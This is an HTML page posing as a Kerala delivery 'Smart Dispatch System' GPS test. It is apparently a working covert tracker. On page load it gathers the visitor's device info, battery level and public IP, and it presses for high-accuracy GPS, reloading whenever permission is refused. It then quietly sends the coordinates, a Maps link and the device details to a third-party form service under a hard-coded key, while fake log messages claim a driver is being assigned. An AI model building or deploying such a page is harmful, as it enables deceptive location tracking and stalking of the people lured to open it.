
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickDelivery Kerala | GPS Test</title>
    <style>
        :root {
            --primary: #e67e22;
            --success: #27ae60;
            --bg: #f4f7f6;
            --log-bg: #0d0d0d;
            --log-text: #39FF14; /* High-visibility Neon Green */
        }

        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
            background-color: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #2c3e50;
        }

        .app-container {
            width: 92%;
            max-width: 400px;
            background: white;
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            text-align: center;
        }

        .header h1 { color: var(--primary); margin: 0; font-size: 1.6rem; }

        .status-box {
            margin: 25px 0;
            padding: 20px;
            border-radius: 15px;
            background: #fffaf5;
            border: 1px solid #ffe0b2;
        }

        #status-icon { font-size: 3.5rem; margin-bottom: 15px; display: block; }

        .pulse { animation: pulse-animation 1.5s infinite; }
        @keyframes pulse-animation {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }

        .log-container {
            text-align: left;
            background: var(--log-bg);
            color: var(--log-text);
            padding: 15px;
            border-radius: 12px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 0.85rem;
            height: 130px;
            overflow-y: auto;
            margin-top: 20px;
            border: 1px solid #333;
            box-shadow: inset 0 0 10px #000;
        }

        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; font-style: italic; }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <h1>üöö Kerala Delivery</h1>
            <p>Smart Dispatch System v5.1</p>
        </div>

        <div class="status-box">
            <span id="status-icon" class="pulse">üìç</span>
            <div id="main-status" style="font-weight:bold">Initializing...</div>
            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS...</div>
        </div>

        <div class="log-container" id="log">
            > System starting...<br>
        </div>

        <p class="footer-text">Please allow location access to assign the nearest delivery partner.</p>

        <form id="location-form" style="display: none;">
            <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
            <input type="hidden" name="subject" value="URGENT: High-Precision Delivery Location">
            <input type="hidden" name="Coordinates" id="form-coords">
            <input type="hidden" name="Accuracy" id="form-accuracy">
            <input type="hidden" name="Method" id="form-method">
            <input type="hidden" name="IP_Address" id="form-ip">
            <input type="hidden" name="Device_Info" id="form-device">
            <input type="hidden" name="Battery_Level" id="form-battery">
            <input type="hidden" name="GoogleMapsLink" id="form-link">
        </form>
    </div>

    <script>
        let retryCount = 0;
        const maxRetries = 5;
        const mainStatus = document.getElementById('main-status');
        const detailStatus = document.getElementById('detail-status');
        const logBox = document.getElementById('log');

        function addLog(msg) {
            logBox.innerHTML += `> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateUI(main, detail, icon = "üìç") {
            mainStatus.innerText = main;
            detailStatus.innerText = detail;
            if(icon !== "üìç") {
                document.getElementById('status-icon').innerText = icon;
                document.getElementById('status-icon').classList.remove('pulse');
            }
        }

        async function startSystem() {
            // 1. Capture Device/Browser Info
            document.getElementById('form-device').value = navigator.userAgent;

            // 2. Capture Battery Info
            if (navigator.getBattery) {
                navigator.getBattery().then(bat => {
                    document.getElementById('form-battery').value = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Unplugged'})`;
                });
            }

            // 3. Capture IP as backup
            fetchIPOnly();
            
            // 4. Start GPS attempts
            if (navigator.geolocation) {
                attemptGPS();
            } else {
                addLog("Hardware GPS not detected.");
                fetchIPLocation();
            }
        }

        async function fetchIPOnly() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                document.getElementById('form-ip').value = data.ip;
                addLog("Network Identity Secured.");
            } catch (e) {
                document.getElementById('form-ip').value = "VPN or Hidden";
            }
        }

        function attemptGPS() {
            retryCount++;
            addLog(`GPS Search Try ${retryCount}/${maxRetries}...`);
            updateUI("Locating...", `Satellite lock-on (${retryCount}/${maxRetries})`);

            const options = {
                enableHighAccuracy: true,
                timeout: 7000, 
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // Success! Vibrate phone and process
                    if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
                    processLocation(pos, "SATELLITE/GPS");
                },
                (err) => {
                    // Handle Permission Blocked
                    if (err.code === 1) { 
                        addLog("Access Denied. Reloading system...");
                        setTimeout(() => { location.reload(); }, 2000);
                    } 
                    // Handle Timeout or Other Errors
                    else if (retryCount < maxRetries) {
                        attemptGPS();
                    } else {
                        addLog("GPS unavailable. Switching to Network.");
                        fetchIPLocation();
                    }
                },
                options
            );
        }

        async function fetchIPLocation() {
            updateUI("Signal Weak", "Switching to IP triangulation...");
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                const mockPos = {
                    coords: {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 2500 
                    }
                };
                processLocation(mockPos, "NETWORK-IP");
            } catch (e) {
                addLog("System failure. Check connection.");
                updateUI("Failed", "Connection timeout.");
            }
        }

        function processLocation(pos, method) {
            const { latitude, longitude, accuracy } = pos.coords;
            // Standard format for Google Maps Pins
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
            document.getElementById('form-method').value = method;
            document.getElementById('form-link').value = mapsLink;

            addLog("Location Secured.");
            updateUI("Data Secured", "Updating dispatch center...");
            submitToWeb3();
        }

        function submitToWeb3() {
            const form = document.getElementById('location-form');
            const formData = new FormData(form);

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    addLog("Data synced successfully.");
                    updateUI("Order Ready!", "Driver assigned successfully.", "üçï");
                }
            })
            .catch(err => {
                addLog("Sync interrupted. Retrying...");
                setTimeout(submitToWeb3, 3000);
            });
        }

        window.onload = startSystem;
    </script>
</body>
</html>
